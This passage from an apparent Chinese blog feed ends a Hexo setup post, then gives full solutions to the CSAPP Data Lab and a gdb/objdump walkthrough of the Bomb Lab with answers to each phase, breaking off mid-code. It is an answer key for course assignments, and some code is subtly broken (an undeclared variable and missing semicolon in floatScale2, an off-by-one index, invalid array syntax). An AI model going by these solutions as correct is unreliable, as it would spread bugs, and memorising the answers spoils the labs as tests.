<p>当然Hexo初始的模版太丑啦，功能也不完全，我们可以到Hexo官网挑选自己喜欢的主题。</p>
<p>之后通过该主题的官方文档即可完成模版的配置。</p>
<p>个人比较喜欢的几个模版：Maupassant、NexT、Purer</p>
<h5 id="博文上传">博文上传</h5>
<p>将你的文章的.md文件放入Blog文件下的source/_posts即可。</p>
<h5 id="问题总结">问题总结</h5>
<p>1.从GitHub获取文件时出现unable to access</p>
<p>可使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export http_proxy=http://proxyAddress:port</span><br></pre></td></tr></table></figure>
<p>让Terminal使用代理，此命令只对当前Terminal生效，若想获取永久代理，可自行Google。</p>
<p>2.安装hero-renderer-sass失败，网络上的常见解决方案对我无效</p>
<p>目前暂未解决该问题，猜想是默认安装的Node.js版本与默认安装的sass版本不匹配。</p>
<p>3.本地网页预览正确，部署到网页上后显示有问题</p>
<p>通过修改站点配置文件_config,yml中的网页url解决。</p>
]]></content>
      <categories>
        <category>萌新之始</category>
      </categories>
      <tags>
        <tag>个人博客</tag>
      </tags>
  </entry>
  <entry>
    <title>《CSAPP》实验解析</title>
    <url>/2022/04/01/%E3%80%8ACSAPP%E3%80%8B%E5%AE%9E%E9%AA%8C%E8%A7%A3%E6%9E%90/</url>
    <content><![CDATA[<p>《CSAPP》实验下载地址：<a href="http://csapp.cs.cmu.edu/3e/labs.html">http://csapp.cs.cmu.edu/3e/labs.html</a></p>
<p>每个实验点击<code>Self-Study Handout</code>即可下载。</p>
<h4 id="lab1-data">Lab1: Data</h4>
<p>实验说明书见：<a href="http://csapp.cs.cmu.edu/3e/datalab.pdf">http://csapp.cs.cmu.edu/3e/datalab.pdf</a></p>
<h5 id="bitxor">bitXor</h5>
<p>取反，注意到<span class="math inline">\(x \oplus y = (x \wedge \neg y) \vee (\neg x \wedge y) = \neg(\neg(x \wedge \neg y) \wedge \neg (\neg x \wedge y))\)</span></p>
<p>从而可以写出答案</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bitXor</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> ~(~(x &amp; ~y) &amp; ~(~x &amp; y));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<span id="more"></span>
<h5 id="tmin">tmin</h5>
<p>只需知道int下最小值的表示即可</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">tmin</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="istmax">isTmax</h5>
<p>利用<span class="math inline">\(Tmax+1 = Tmin\)</span>的性质即可，我们有<span class="math inline">\(Tmax+1+Tmax+1 = 0\)</span>，但是<span class="math inline">\(-1\)</span>也满足这个性质，所以需要排除这一特殊情况</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isTmax</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !(x+<span class="number">1</span>+x+<span class="number">1</span>) &amp; !!(x+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="alloddbits">allOddBits</h5>
<p>只要我们能生成一个只有奇数位全为1的数（即0xAAAAAAAA），是不是就可以利用这个数来判断呢？我们还需知道一个常用技巧用位运算判断两个数相不相同，如果<span class="math inline">\(a\)</span>与<span class="math inline">\(b\)</span>相同，则<span class="math inline">\(\neg (a \oplus b) = 1\)</span></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">allOddBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> A4 = (<span class="number">0xAA</span> &lt;&lt; <span class="number">8</span>) | <span class="number">0xAA</span>;</span><br><span class="line">    <span class="keyword">int</span> A8 = (A4 &lt;&lt; <span class="number">16</span>) | A4;</span><br><span class="line">    <span class="keyword">return</span> !((x &amp; A8) ^ A8);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="negate">negate</h5>
<p>显然有$x + (～x) = -1 $</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">negate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ~x + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="isasciidigit">isAsciiDigit</h5>
<p>我们可以注意到，一个char范围的数要在范围内首先需要十六进制表示的高位是3，其次需要低位的范围在<span class="math inline">\(0～9\)</span>之间，前者是容易实现的，后者的判断需要一些小trick，我们只利用位运算似乎并不容易判断范围，但是我们是容易判断符号的，那么我们可以通过添加一个偏置（bias）来改变范围。只要思考到这，我们就容易想到，我们给低位减去10（0xA），之后在要求范围内的数就会变为负数，不在要求范围的都为非负数，从而我们可以有如下实现</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isAsciiDigit</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> is_3 = !((x &gt;&gt; <span class="number">4</span>) ^ <span class="number">0x3</span>);</span><br><span class="line">    <span class="keyword">int</span> nl = (x &amp; <span class="number">0xF</span>) + (~<span class="number">0xA</span> + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> is_neg = (nl &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x1</span>;</span><br><span class="line">    <span class="keyword">return</span> is_3 &amp; is_neg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="conditional">conditional</h5>
<p>只用位运算实现三目运算x ? y : z，我们的一个初步想法应该是为y和z生成一个系数cy和cz，这两个系数如果能满足x为0时，cy为0，cz为1；x非0时，cy为1，cz为0，那么我们就可以利用<span class="math inline">\(cy*y + cz*z\)</span>来得到结果。可是我们不能利用乘法，不过我们可以有一些类似的方式得到这样的效果，比如利用异或的性质，或利用生成相反数来对不同情况下抵消y或抵消z，下面我们给一个利用异或的性质的做法</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">conditional</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y, <span class="keyword">int</span> z)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> not_0 = !!x;</span><br><span class="line">    <span class="keyword">int</span> gen = ~not_0 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> cy = y &amp; ~gen;	<span class="comment">// if x==0, gen=0, cy=y, else cy = 0</span></span><br><span class="line">    <span class="keyword">int</span> cz = z &amp; gen;	<span class="comment">// if x==0, gen=0, cz=z, else cz = z</span></span><br><span class="line">    <span class="keyword">return</span> (y ^ cy) + (z ^ cz);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="islessorequal">isLessOrEqual</h5>
<p>如果试图直接判断<span class="math inline">\(x-y \leq0\)</span>的话，是会炸的，比如<span class="math inline">\(y = INT\_MIN\)</span>的情况，因此本人的想法是做一个讨论，当然就会导致实现相对比较复杂。我们首先考虑x和y的符号，如果x和y异号的话，当<span class="math inline">\(x &lt; 0\)</span>且<span class="math inline">\(y \geq 0\)</span>时，是显然满足条件的，如果x和y同号的话，我们只需比较二进制表示的末尾31位即可，因为第32位的符号位两者相同，之后要注意一点是小于等于0的判断更加复杂，但是我们转化为<span class="math inline">\(-x + y \geq 0\)</span>的话，就可以直接利用一位符号位进行判定，因此利用上述想法可以给出下面的实现</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">isLessOrEqual</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sx = (x &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x1</span>;</span><br><span class="line">    <span class="keyword">int</span> sy = (y &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x1</span>;</span><br><span class="line">    <span class="keyword">int</span> x_plus = x &amp; (~(<span class="number">1</span> &lt;&lt; <span class="number">31</span>));</span><br><span class="line">    <span class="keyword">int</span> y_plus = y &amp; (~(<span class="number">1</span> &lt;&lt; <span class="number">31</span>));</span><br><span class="line">    <span class="keyword">int</span> y_minus_x = y_plus + (~x_plus + <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> ck = !((y_minus_x &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x1</span>);</span><br><span class="line">    <span class="keyword">return</span> (sx &amp; !sy) | (~(sx ^ sy) &amp; ck);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="logicalneg">logicalNeg</h5>
<p>我们可以可用取反的一个巧妙性质，这其实是在利用取反计算一个数的相反数时学到的。对一个位表示<span class="math inline">\([x_{w-1}, x_{w-2}, \cdots, x_1, x_0]\)</span>，设第<span class="math inline">\(k\)</span>位是从左到右第一个为<span class="math inline">\(1\)</span>的位，即<span class="math inline">\([x_{w-1}, \cdots, x_{k+1}, 1, 0, \cdots, 0]\)</span>，则计算相反数，即取反加一后，我们得到<span class="math inline">\([～x_{w-1}, \cdots, ～x_{k+1}, 1, 0, \cdots, 0]\)</span>，即从第<span class="math inline">\(0\)</span>到第<span class="math inline">\(k\)</span>位的值不变，剩下的位都取反。这时就可以注意到，对于一个非0的数，除了只有最高位为1的情况，别的都能做到将x与-x做异或后，得到结果的最高位为1，因此只需特判一下最高位为1的情况就好，这时的数显然非0</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">logicalNeg</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ck = ((x ^ (~x + <span class="number">1</span>)) &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x1</span>;</span><br><span class="line">    <span class="keyword">int</span> msb = (x &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x1</span>;</span><br><span class="line">    <span class="keyword">return</span> ~(msb | ck) &amp; <span class="number">0x1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="howmanybits">howManyBits</h5>
<p>写两个数做例子，12=0x0000000C，-5=0xFFFFFFFB，我们可以发现只需要把32位减去从左往右数所有相同的位的数量再加上一位符号位即可得到答案，比如对于12，从左到右有连续的28位0，因此32-28+1=5即是答案，对于-5，从左到右有连续的29位1，因此32-29+1=4即是答案。所以我们要考虑如何计算除了从左到右连续相同的位剩下位的数量。先考虑正数的情况，即我们需要找除了从左到右的0的外剩下的位的数量，可以考虑手工模拟分治的做法。我们先考虑前16位，如果为0，说明这16位都为0，则考虑后16位中的前8位，如果不是0，则说明从左开始连续的0在前16位之前就结束了，这时我们继续考虑前16位中的前8位，以此类推即可得到结果。对于负数的情况，我们只需要把数取反，就可以跟正数的情况一样考虑啦</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a16, a8, a4, a2, a1, a0;</span><br><span class="line">    <span class="keyword">int</span> msb = (x &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x1</span>;</span><br><span class="line">    <span class="keyword">int</span> bias = ~msb + <span class="number">1</span>;</span><br><span class="line">    x ^= bias;	<span class="comment">//if msb=1, bias=-1, x ^ bias = ~x</span></span><br><span class="line">    a16 = !!(x &gt;&gt; <span class="number">16</span>) &lt;&lt; <span class="number">4</span>;</span><br><span class="line">    x &gt;&gt;= a16;</span><br><span class="line">    a8 = !!(x &gt;&gt; <span class="number">8</span>) &lt;&lt; <span class="number">3</span>;</span><br><span class="line">    x &gt;&gt;= a8;</span><br><span class="line">    a4 = !!(x &gt;&gt; <span class="number">4</span>) &lt;&lt; <span class="number">2</span>;</span><br><span class="line">    x &gt;&gt;= a4;</span><br><span class="line">    a2 = !!(x &gt;&gt; <span class="number">2</span>) &lt;&lt; <span class="number">1</span>;</span><br><span class="line">    x &gt;&gt;= a2;</span><br><span class="line">    a1 = !!(x &gt;&gt; <span class="number">1</span>);</span><br><span class="line">    x &gt;&gt;= a1;</span><br><span class="line">    a0 = x;</span><br><span class="line">    <span class="keyword">return</span> a16 + a8 + a4 + a2 + a1 + a0 + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="floatscale2">floatScale2</h5>
<p>浮点数操作允许使用条件和循环语句啦，舒服了好多！不太需要上面一些位运算题需要的小trick了。所以我们只需要熟悉浮点数的表示方式，按不同情况讨论就好了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatScale2</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="built_in">exp</span> = (f &gt;&gt; <span class="number">23</span>) &amp; <span class="number">0xFF</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0xFF</span>)	<span class="comment">//Special case</span></span><br><span class="line">        <span class="keyword">return</span> uf;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">exp</span> == <span class="number">0</span>)		<span class="comment">//Denormalized</span></span><br><span class="line">        <span class="comment">//如果frac部分的最高位是0的话，显然是正确的，如果最高位是1的话，最高位的1右移后变到了exp的</span></span><br><span class="line">        <span class="comment">//部分，但是容易验证这时也是对的</span></span><br><span class="line">        <span class="keyword">return</span> (uf &lt;&lt; <span class="number">1</span>) | (uf &amp; <span class="number">0xFF800000</span>);</span><br><span class="line">    <span class="keyword">return</span> uf + (<span class="number">1</span> &lt;&lt; <span class="number">23</span>)	<span class="comment">//Normalized，指数+1即可</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="floatfloat2int">floatFloat2Int</h5>
<p>还是只需要做情况讨论就好了，难度不大</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">floatFloat2Int</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, E, s, ret = <span class="number">0</span>;</span><br><span class="line">    s = (uf &gt;&gt; <span class="number">31</span>) &amp; <span class="number">0x1</span>;</span><br><span class="line">    E = ((uf &gt;&gt; <span class="number">23</span>) &amp; <span class="number">0xFF</span>) - <span class="number">127</span>;</span><br><span class="line">    <span class="keyword">if</span> (E &lt; <span class="number">0</span>)	<span class="comment">//显然E&lt;0时，浮点数的绝对值小于1，取整后为0</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (E &gt; <span class="number">30</span>)	<span class="comment">//溢出</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= E; i++)	<span class="comment">//把所有整数部分加起来</span></span><br><span class="line">        ret += ((uf &gt;&gt; (<span class="number">23</span> - i)) &amp; <span class="number">0x1</span>) &lt;&lt; (E - i);</span><br><span class="line">    ret += <span class="number">1</span> &lt;&lt; E;	<span class="comment">//别忘了(1+f)*2^E中的1</span></span><br><span class="line">    <span class="keyword">if</span> (s) ret *= <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="floatpower2">floatPower2</h5>
<p>我们需要熟悉浮点数表示的最大和最小范围，对于32位的单精度浮点数float，有23位小数部分和8位指数部分，可以表示的最小数为<span class="math inline">\(2^{-23}\times 2^{1-127} = 2^{-149}\)</span>，最大数为<span class="math inline">\((2-2^{-23}) \times 2^{254-127}\)</span>，故可以表示的最大的2的幂次为<span class="math inline">\(2 ^{127}\)</span>，对于可以表示的情况，只需要给出构造即可</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatPower2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x &lt; <span class="number">-149</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (x &gt; <span class="number">127</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0xFF</span> &lt;&lt; <span class="number">23</span>;</span><br><span class="line">    <span class="keyword">if</span> (x &lt; <span class="number">-126</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; (x + <span class="number">149</span>);</span><br><span class="line">    <span class="keyword">return</span> (x + <span class="number">127</span>) &lt;&lt; <span class="number">23</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="lab2-bomb">Lab2: Bomb</h4>
<p>实验说明书见：<a href="http://csapp.cs.cmu.edu/3e/bomblab.pdf">http://csapp.cs.cmu.edu/3e/bomblab.pdf</a></p>
<p>先简单看一下<code>bomb.c</code>文件，发现主体就是有6个问题，每次读一行，用一个phase函数判断我们输入的东西是不是正确的。我们使用<code>objdump -d bomb</code>即可将可执行文件<code>bomb</code>反汇编，重定向输出得到汇编代码文件<code>bomb.s</code>，之后就是要慢慢读这个汇编文件，帮我们确认我们该输入什么了。</p>
<h5 id="phase_1">phase_1</h5>
<p>进入汇编文件，既然我们要找的函数是 phase_1()，直接搜索即可。发现汇编代码并不长，逻辑比较简单。首先是分配栈空间，将<code>0x402400</code>这个地址传递给寄存器%esi，之后调用<code>strings_not_equal</code>这个函数，我们查找这个函数的位置。这个函数的汇编代码相对较长，但我们根据名字也能知道它的功能是什么，仔细读完发现这个函数的功能就是比较%rdi与%rsi这两个寄存器所指地址的字符串相不相同，%rdi寄存器的值就是我们输入的字符串的地址，%rsi就是我们刚刚传入的<code>0x402400</code>。我们可以通过gdb调试，看看这个地址处的字符串是什么。gdb可以使用<code>x/s</code>查看某地址处值的字符串格式，因此我们在gdb模式下，使用命令<code>x/s 0x402400</code>，得到的结果是<code>Border relations with Canada have never been better.</code> 我们运行 bomb 程序，输入上述字符串，即可发现正确通过第一关。</p>
<h5 id="phase_2">phase_2</h5>
<p>读一读 phase_2() 函数的汇编代码。发现它首先读入了6个数，且分别存在栈的位置为%rsp, %rsp+4, %rsp+8, %rsp+12, %rsp+16, %rsp+20。首先将第一个数与0x1比较，如果相等就跳转到<code>400f30</code>，否则就直接<code>explode_bomb</code>了，因此可以确定第一个数为1. 跳到<code>400f30</code>继续，它将第二个数的地址存入了寄存器%rbx中，将%rsp+0x18也就是%rsp+24的地址存入寄存器%rbp中，可以猜测是判断6个数循环是否到最后用的。之后几题也有用到类似的方法。之后跳转到<code>400f17</code>，将%rbx-0x4地址处的值存入%eax，也就是把第一个数存入了%eax，之后%eax加上本身，即将其所存的值乘以2，比较%eax的值与%rbx所存地址指向的值，要求两者相等，否则爆炸，因此可以知道第二个数为第一个数的2倍，之后把%rbx的地址加4，指向下一个数，只要不等于%rbp的地址，就继续。因此可以知道这就是一个循环，遍历6个数中的后5个，每个数得是前一个数的两倍。因此我们可以确定出答案为：1 2 4 8 16 32.</p>
<h5 id="phase_3">phase_3</h5>
<p>发现这一问将%rsp+0xc即%rsp+12的地址存入%rcx，将%rsp+0x8即%rsp+8的值存入%rdx，之后我们就需要调用这两个值。（这里我有个小疑问，为什么使用的值不是从栈顶开始的？）发现我们调用了一个sscanf，将输入的字符串，读入为整数，且我们的输入个数应该是大于1的，否则爆炸。然后发现我们的第一个数应该在0～7之间，并且将第一个数存入了%eax，之后我们要跳转到<code>*0x402470(,%rax,8)</code>，所以我们得先查看一下<code>0x402470</code>处的值是多少，我们还是<code>gdb bomb</code>，然后使用命令<code>x/x 0x402470</code>，得到该地址处的十六进制表示的值，结果为0x400f7c，所以我们要跳转到0x400f7c + 8 * %rax，如果我们第一个参数为0，则跳转到0x400f7c，将%eax的值设为0xcf，即十进制的207。之后跳转到<code>400fbe</code>，比较我们输入的第二个数和%eax处的值，要求两者相等。因此我们知道我们输入的第二个数应该是207。从而得到答案为：0 207. 类似的，1 311，2 707，3 256，4 389，5 206，6 682，7 327都可以是答案。</p>
<h5 id="phase_4">phase_4</h5>
<p>与上一问类似，还是读入了两个数，第一个数设为<span class="math inline">\(a_1\)</span>，在调用 func4 函数之前，存入了寄存器%edi中，第二个数设为<span class="math inline">\(a_2\)</span>，存入寄存器%rcx中。此时%edx的值为14，%esi的值为0，调用函数 func4. 该函数是个递归函数，我们可以写出如下函数</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// x in %edx, y in %esi</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t1 = ((x - y) + ((x - y) &gt;&gt; <span class="number">31</span>)) &gt;&gt; <span class="number">1</span>; <span class="comment">// %eax</span></span><br><span class="line">    <span class="keyword">int</span> t2 = t1 + y; <span class="comment">// %ecx</span></span><br><span class="line">    <span class="keyword">if</span> (t2 &lt;= a1) &#123;</span><br><span class="line">        t1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (t2 &gt;= a1) <span class="keyword">return</span> t1;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            y = t2 + <span class="number">1</span>;</span><br><span class="line">            t1 = func4(x, y);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span> * t1 + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        x = t2 - <span class="number">1</span>;</span><br><span class="line">        t1 = <span class="number">2</span> * func4(x, y);</span><br><span class="line">        <span class="keyword">return</span> t1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现我们调用 func4(14, 0) 函数的返回值必须是0，否则爆炸。我们发现进入函数后，t2 = 7，此时只需要a1也等于7，函数就根本不会进入到递归部分，直接返回0了。当然笔者发现a1 = 0、1或3也是可以的。同时%rsp+0xc，也就是我们输入的第二个数的值得是0，所以我们可以得到答案：7 0 或 0 0 或 1 0 或 3 0 。</p>
<h5 id="phase_5">phase_5</h5>
<p>首先可以注意到调用了一个 string_length 函数，判断我们输入的字符串长度必须为6，否则爆炸。此时%rbx的值为%rdi的值，我们可以发现程序的逻辑是每次调用 %rbx + %rax 处的地址，将该地址指向的值与0xf按位与，也就是取这个值的末4位，将这个值加上0x4024b0，得到这个地址处的值，将其存入%rsp + %rax + 0x10。每次将%rax加1，也就是遍历我们输入的字符串的6个字符，取其值的末4位，得到<span class="math inline">\(l_i\)</span>，然后将这一位的字符转化为<span class="math inline">\(0x4024b0+l_i\)</span>所地址所对应的字符。将转化后的字符串存入了%rsp+0x10。下一部分就是给这六个字符的末尾添加上'\0'，得到字符串，将这个字符串与0x40245e地址处的字符串比较，要求两者相等。下面给出一段C语言代码做参考。我们用gdb调试查看0x40245e处的字符串是什么。通过指令<code>x/s 0x40245e</code>，得到的是"flyers"正好是6个字符。我们再查看一下0x4024b0处是什么东西，发现这是一个字符串"maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?"，也就是我们需要找到对应的字母的位置，f在该字符串的第9位，同样的l为15，y为14，e为5，r为6，s为7. 即我们需要输入一个字符串，其整数值的末4位分别为9，15，14，5，6，7. 我们可以简单的加上96，并不影响末4位的值，从而得到105，111，110，101，102，103，对应的字符串“ionefg"即为答案，当然只要满足末4位是上述的值，都是正确的答案。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> stand[] = <span class="string">&quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</span>;</span><br><span class="line"><span class="keyword">char</span> ans[] = <span class="string">&quot;flyers&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">(<span class="keyword">char</span> *in)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> tmp[<span class="number">16</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(in) != <span class="number">6</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> t = in[i] &amp; <span class="number">0xf</span>;</span><br><span class="line">        tmp[i] = stand[t];</span><br><span class="line">    &#125;</span><br><span class="line">    tmp[<span class="number">7</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(tmp, ans) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="phase_6">phase_6</h5>
<p>压轴还是蛮难的。首先是读入了6个数，先观察程序的第一部分，虽然比较长，但是可以看出就是一个简单的循环，遍历6个数，判断他们减1的值都得在0～5直接，也就是6个数得在1～6的范围内，且6个数两两互不相同。之后第二部分就是用%rax遍历了一遍这6个数，将每个数<span class="math inline">\(a_i\)</span>变成<span class="math inline">\(7-a_i\)</span>。此时%rsi的值为0，之后是取出栈顶的值（<span class="math inline">\(7-a_1\)</span>），存入%ecx，判断它如果小于等于1（其实也就只可能是等于1），那就把地址0x6032d0处的值存入%edx，再把这个值存入 %rsp + 2*%ris + 0x20，再把%rsi加上4，只要不为0x18 （24）就继续循环，相当于遍历6个数，做相同的操作。如果值大于1，则将%eax设为1，将0x6032d0存入%edx，跳转至401176，将%edx的值不断加8，并将%edx转化为当前%edx所指的位置，每次把%eax也加1，直到%eax等于%ecx处的值为止，也就是把%edx进行<span class="math inline">\(7-a_i\)</span>步，每次将地址加8，并取出该地址处的值存回%edx. 之后把这个地址存入%rsp + 2*%ris + 0x20。两者综合来说就是，遍历6个数，对于 7-ai ，把 0x6032d0 向后走 (7 - ai - 1) 处的值，存入地址 %rsp + 2 * (4 * (i-1)) + 0x20 中。下一部分就是遍历了我们刚刚得到的6个值，他们是一系列地址，将地址转化为他们所指向的值。最后一部分是要求转化后的这6个数，前一个必须比后一个大，即必须是一个单调递减的序列。我们现在就是要去查看地址0x6032d0处到底是什么东西就好了。先用<code>x/x 0x6032d0</code>发现打印出的是一个node1，我们索性打印出后面的东西，得到如下图所示的结果。</p>
<p><img src="/images/《CSAPP》实验解析/phase_6.png" alt="phase_6" style="zoom:50%;" /></p>
<p>我们发现这是一个链表，这6个节点的值要单调减的顺序为，node3，node4，node5，node6，node1，node2，因此我们知道我们7 - ai 的值分别应该为3，4，5，6，1，2，故初始值为4，3，2，1，6，5，即为答案。下面给一个C语言程序做参考</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">nxt</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">nptr</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">head</span> =</span> nptr;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">make_node</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v[] = &#123;<span class="number">0x14c</span>, <span class="number">0xa8</span>, <span class="number">0x39c</span>, <span class="number">0x2b3</span>, <span class="number">0x1dd</span>, <span class="number">0x1bb</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++) &#123;</span><br><span class="line">        nptr-&gt;val = v[i];</span><br><span class="line">        nptr-&gt;nxt = (struct node *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct node));</span><br><span class="line">        nptr = nptr-&gt;nxt;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_six_numbers</span><span class="params">(<span class="keyword">int</span> *a)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">check</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[];</span><br><span class="line">    <span class="keyword">int</span> cnt = read_six_numbers(a);</span><br><span class="line">    <span class="keyword">if</span> (cnt != <span class="number">6</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> r12d = <span class="number">0</span>, i = <span 